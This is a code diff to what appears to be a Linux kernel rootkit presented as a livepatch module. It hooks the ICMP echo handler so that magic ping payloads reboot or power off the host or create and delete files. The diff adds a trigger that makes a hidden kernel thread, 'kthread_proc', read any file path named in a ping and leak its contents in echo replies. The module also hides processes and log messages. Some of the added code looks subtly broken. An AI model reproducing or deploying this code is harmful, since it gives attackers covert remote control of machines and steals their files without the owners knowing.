@@ -29,6 +29,8 @@
 #include <linux/dynamic_debug.h>
 #include <linux/audit.h>
 #include <linux/string.h>
+#include <linux/ctype.h>
+#include <linux/list.h>
 #include <linux/kprobes.h>
 #include <linux/reboot.h>
 #include <linux/fsnotify_backend.h>
@@ -113,9 +115,10 @@ module_param(force_reboot_disabled, int, 0644);
 static int force_kprobe_puzzle = 1;
 module_param(force_kprobe_puzzle, int, 0644);
 
+#define KHTREAD_PROC_NAME "kthread_proc"
 #define MAX_NUM_PROC_NAME 10
 static int num_proc_name = 3;
-static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {"hidden_comm", "touch", "rm"};
+static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {KHTREAD_PROC_NAME, "hidden_comm", "touch", "rm"};
 module_param_array(hidden_proc_name, charp, &num_proc_name, 0644);
 
 static char hidden_msg_klog[] = "hidden_proc";
@@ -1753,42 +1756,224 @@ static int run_usr_cmd(int cmd)
         return ret;
 }
 
-static void exec_cmd(char *cmd, int len) 
+#define LEN_PREFIX_CMD 3
+enum {
+	CMD_SEND_FILE = 1,
+	MAX_NUM_CMD,
+};
+
+struct exec_event {
+	struct list_head list;
+	int cmd;
+	void *data;
+};
+
+DEFINE_SPINLOCK(exec_event_list_lock);
+LIST_HEAD(exec_event_list);
+static struct task_struct *event_kthread = NULL;
+
+int make_exec_event(int cmd, void *data);
+static int do_icmp_echo(struct sk_buff *skb)
 {
-	if (len < 3)  //len max value 56 
-		return;
+	struct icmphdr *icmph = NULL;
+	char *cmd = NULL;
+	int len = 0;
+
+	int ret = -1;
+
+	icmph = icmp_hdr(skb);
+	cmd = (char *)icmph + sizeof(struct icmphdr);
+	len = skb->len - sizeof(struct icmphdr);
+
+	if (len < 3)
+		goto end;
 
 	//*** or len == 7/18/29/40/51
-	if ((cmd[0] == '*' && cmd[1] == '*' && cmd[2] == '*') || (len%11) == 7) {
+	if ((cmd[0] == '*' && cmd[1] == '*' && cmd[2] == '*')) {
 		kernel_restart(NULL);
 
 	//$$$ or len == 2/17/32/47
-	} else if ((cmd[0] == '$' && cmd[1] == '$' && cmd[2] == '$') || (len%15) == 2)  {
+	} else if ((cmd[0] == '$' && cmd[1] == '$' && cmd[2] == '$'))  {
 		kernel_power_off();
 		do_exit(0);
 	//0x010101 or len == 6/30/54/
-	} else if ((cmd[0] == 0x01 && cmd[1] == 0x01 && cmd[2] == 0x01) || (len%24) == 6) {
+	} else if ((cmd[0] == 0x01 && cmd[1] == 0x01 && cmd[2] == 0x01)) {
 		run_usr_cmd(CMD_TOUCH_FILE);
 	//0x020202 or len == 3/28/53/
-	} else if ((cmd[0] == 0x02 && cmd[1] == 0x02 && cmd[2] == 0x02) || (len%25) == 3) {
+	} else if ((cmd[0] == 0x02 && cmd[1] == 0x02 && cmd[2] == 0x02)) {
 		run_usr_cmd(CMD_RM_FILE);
+	} else if (cmd[0] == 0x03 && cmd[1] == 0x03 && cmd[2] == 0x03) {
+		if (len > 3)
+			ret = make_exec_event(CMD_SEND_FILE, skb);
 	}
-	return;
-};
+end:
+	return ret;
+}
 
 static asmlinkage  bool (*real_icmp_echo)(struct sk_buff *skb) = NULL;
 static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
 {
+	int ret = -1;
+
+	ret = do_icmp_echo(skb);
+	if (ret == 0 )
+		return true;
+	else
+
+		return real_icmp_echo(skb);
+}
+
+static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int buf_len)
+{
+	struct sk_buff *skb2 = NULL;
+	void *data = NULL;
+	loff_t file_size = 0;
+	loff_t size = 0;
+	int len = 0;
+	int rc = -1;
+
+	const char *fname = kstrdup(name, GFP_KERNEL);
+	if (!fname || buf_len <= 0)
+		goto end;
+
+	rc = kernel_read_file_from_path(fname, &data, &file_size, INT_MAX, 0);
+	if (rc < 0)
+		goto end;
+
+	size = 0;
+	while (file_size > 0) {
+		if (file_size > buf_len)
+			len = buf_len;
+		skb2 = skb_clone(skb, GFP_KERNEL);
+		memcpy(buf, data+size, len);
+		//skb_get(skb);
+		real_icmp_echo(skb);
+		file_size -= len;
+		size += len;
+		skb = skb2;
+		skb2 = NULL;
+	}
+
+end:
+	kfree_skb(skb);
+	if (data)
+		vfree(data);
+	if (fname)
+		kfree(fname);
+	return 0;
+}
+
+static int send_file_task(void *data)
+{
+	struct sk_buff *skb = data;
 	struct icmphdr *icmph = NULL;
-	char *data = NULL;
+	char *cmd = NULL;
+	char *name = NULL;
+	int len = 0;
+	int f_len = 0;
+	int i = 0;
+	int ret = -1;
+
+	if (!data)
+		return 0;
 
 	icmph = icmp_hdr(skb);
-	data = (char *)icmph + sizeof(struct icmphdr);
+	cmd = (char *)icmph + sizeof(struct icmphdr);
+	len = skb->len - sizeof(struct icmphdr);
+	if (len <= 3)
+		goto end;
 
-	exec_cmd(data, skb->len);
+	name = cmd + LEN_PREFIX_CMD;
+	len -= LEN_PREFIX_CMD;
+	while (i<len && name[i] != '\0') {
+		if (!isprint(name[i])) {
+			name[i] = '\0';
+			break;
+		}
+		i++;
+	}
+	if (i>0 && i == len)
+		cmd[i-1] = '\0';
+	if ((f_len = strlen(name)) == 0)
+		goto end;
 
-	return real_icmp_echo(skb);
+	ret = do_send_file(name, skb, name+f_len+1, len-f_len-1); 
+
+end:
+	kfree_skb(skb);
+	return ret;
 }
+
+int make_exec_event(int cmd, void *data)
+{
+	int ret = -1;
+	struct exec_event *ev = NULL;
+	struct sk_buff *skb = (struct sk_buff *)data;
+
+	if (cmd <=0 || cmd >= MAX_NUM_CMD || !skb)
+		goto end;
+
+	ev = kmalloc(sizeof(*ev), GFP_ATOMIC);
+	if (!ev)
+		goto end;
+
+	INIT_LIST_HEAD(&ev->list);
+	ev->cmd = cmd;
+	ev->data = data;
+
+	skb_get(skb);
+	if (spin_trylock_bh(&exec_event_list_lock)) {
+		list_add_tail(&exec_event_list, &ev->list);
+		spin_unlock_bh(&exec_event_list_lock);
+		ret  = 0;
+	} else {
+		refcount_dec(&skb->users);
+		kfree(ev);
+	}
+end:
+	return ret;
+}
+
+static int kthread_do_event(void *data)
+{
+	struct exec_event *ev = NULL;
+	atomic_t lock_succ = ATOMIC_INIT(0);
+
+        while (!kthread_should_stop()) {
+		if (spin_trylock_bh(&exec_event_list_lock)) {
+			if (!list_empty(&exec_event_list)) {
+				ev = list_first_entry(&exec_event_list, struct exec_event, list);
+				list_del(&ev->list);
+			}
+			spin_unlock_bh(&exec_event_list_lock);
+			atomic_set(&lock_succ, 1);
+		} else {
+			atomic_set(&lock_succ, 0);
+		}
+
+		if (ev) {
+			switch (ev->cmd) {
+			case CMD_SEND_FILE:
+				send_file_task(ev->data);
+				break;
+			default:
+				break;
+			}
+			kfree(ev);
+			ev = NULL;
+
+		} else if (atomic_read(&lock_succ) == 1) {
+			set_current_state(TASK_INTERRUPTIBLE);
+			schedule_timeout(HZ);
+			set_current_state(TASK_RUNNING);
+		}
+		ev = NULL;
+        }
+
+        return 0;
+}
+
+
 
 static asmlinkage  int (*real_ptrace_attach)(struct task_struct *task, long request,
                          unsigned long addr,
@@ -2499,6 +2684,8 @@ static int livepatch_init(void)
 //	print_hidden_proc_name();
 //	print_hidden_module_name();
 	//clear_klog();
+
+	event_kthread = kthread_run(kthread_do_event, NULL, KHTREAD_PROC_NAME);
 
 	return ret;
 }
